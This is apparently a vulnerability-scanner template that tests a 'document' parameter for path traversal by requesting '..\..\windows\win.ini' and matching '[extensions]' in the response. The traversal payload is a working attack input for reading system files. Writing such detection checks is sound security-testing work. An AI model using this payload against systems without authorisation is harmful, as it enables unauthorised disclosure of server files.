id: lfi6-0646
name: 'Traversal in document'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via document'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      document:
        - '..\..\windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
